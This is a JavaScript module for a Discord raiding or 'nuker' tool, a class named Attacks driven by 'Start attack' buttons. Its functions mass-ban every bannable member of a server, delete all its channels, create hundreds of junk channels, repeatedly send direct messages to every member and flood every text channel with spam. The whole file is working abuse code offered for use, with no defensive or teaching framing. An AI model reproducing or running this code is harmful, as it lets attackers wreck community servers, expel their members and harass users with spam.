const Discord = require("discord.js")
const buttons = require("./buttons.js")
const errors = require("./errors.js")

class Attacks {

    constructor() {
        this.channelsMakerAttack = false
        this.springCleaningAttack = false
        this.lastJudgementAttack = false
        this.spammerAttack = false
        this.channelsSpammerAttack = false

    }

    defineClient(client = new Discord.Client()) {
        this.client = client
    }

    verifClientExists() {
        return !!this.client
    }

    clientHasPermissions(guild = new Discord.Guild(), permission = String) {
        return !!guild.members.get(this.client.user.id).hasPermission(permission)
    }

    async lastJudgement(guildID = new Discord.Guild().id) {
        if (this.verifClientExists()) {
            buttons.changeTextButton("last-judgement-btn", "Press to stop...")
            buttons.globalButtonFunctionChanger("last-judgement-btn", "onClick", "reviewJudgement()")

            const guild = this.client.guilds.get(guildID)
            if (this.clientHasPermissions(guild, 4)) {
                guild.members.forEach(async (member) => {
                    if (!this.lastJudgementAttack) {
                        buttons.changeTextButton("last-judgement-btn", "Start attack")
                        buttons.globalButtonFunctionChanger("last-judgement-btn", "onClick", "lastJudgement()")
                        return 0
                    }
                    if (member.bannable) await member.ban()
                })
                buttons.changeTextButton("last-judgement-btn", "Start attack")
                buttons.globalButtonFunctionChanger("last-judgement-btn", "onClick", "lastJudgement()")
                return 0
            }
        }
        return 1
    }

    async springCleaning(guildID = new Discord.Guild().id) {
        if (this.verifClientExists()) {
            const guild = this.client.guilds.get(guildID)

            if (this.clientHasPermissions(guild, 16)) {
                buttons.changeTextButton("spring-cleaning-btn", "Press to stop...")
                buttons.globalButtonFunctionChanger("spring-cleaning-btn", "onClick", "stopSpringCleaning()")


                guild.channels.forEach(async (channel) => {
                    await channel.delete()
                })
                buttons.changeTextButton("spring-cleaning-btn", "Start attack")
                buttons.globalButtonFunctionChanger("spring-cleaning-btn", "onClick", "springCleaning()")
                return 0
            }
        }
        return 1
    }

    async channelsMaker(guildID = new Discord.Guild().id, channelsName = String) {
        if (this.verifClientExists()) {
            const guild = this.client.guilds.get(guildID)
            if (this.clientHasPermissions(guild, 16)) {
                buttons.changeTextButton("channels-maker-btn", "Press to stop...")
                buttons.globalButtonFunctionChanger("channels-maker-btn", "onClick", "stopChannelsMaker()")
                const maxRange = Math.abs(500 - guild.channels.array().length)

                let index = 0
                setInterval(async () => {
                    if (index == maxRange || !this.channelsMakerAttack) {
                        buttons.changeTextButton("channels-maker-btn", "Start attack")
                        buttons.globalButtonFunctionChanger("channels-maker-btn", "onClick", "channelsMaker()")

                        return 0
                    }
                    await guild.createChannel(channelsName, { type: "text", permissionOverwrites: 0 })
                    index += 1

                }, 300)
            }
        }

        return 1
    }

    async spammer(guildID = new Discord.Guild().id, messageContent = String) {
        if (this.verifClientExists()) {

            if (messageContent.replace(" ", "") == "") {
                errors.displayError(errors.type.EMPTY_MESSAGE)
                return 1
            }

            errors.hideError()

            const guild = this.client.guilds.get(guildID)
            buttons.changeTextButton("spammer-btn", "Press to stop...")
            buttons.globalButtonFunctionChanger("spammer-btn", "onClick", "stopSpammer()")

            setInterval(async () => {
                guild.members.forEach(async (member) => {
                    setTimeout(async () => {
                        if (!this.spammerAttack) {
                            buttons.changeTextButton("spammer-btn", "Start attack")
                            buttons.globalButtonFunctionChanger("spammer-btn", "onClick", "spammer()")
                            return 0
                        }
                        if (!member.user.bot) await member.send(messageContent)
                    }, 225)
                })
            }, 225)
        }

        return 1
    }

    async channelsSpammer(guildID = new Discord.Guild().id, messageContent = String) {
        if (this.verifClientExists()) {

            if (messageContent.replace(" ", "") == "") {
                errors.displayError(errors.type.EMPTY_MESSAGE)
                return 1
            }

            errors.hideError()

            const guild = this.client.guilds.get(guildID)
            if (this.clientHasPermissions(guild, 2048) && this.clientHasPermissions(guild, 1024)) {
                buttons.changeTextButton("channels-spammer-btn", "Press to stop...")
                buttons.globalButtonFunctionChanger("channels-spammer-btn", "onClick", "stopChannelsSpammer()")

                setInterval(async () => {
                    guild.channels.forEach(async (channel) => {
                        if (!this.channelsSpammerAttack) {
                            buttons.changeTextButton("channels-spammer-btn", "Start attack")
                            buttons.globalButtonFunctionChanger("channels-spammer-btn", "onClick", "channelsSpammer()")
                            return 0
                        }
                        if (channel.type == "text") await channel.send(messageContent)

                    })
                }, 350)
            }
        }
        return 1
    }

}

module.exports = new Attacks

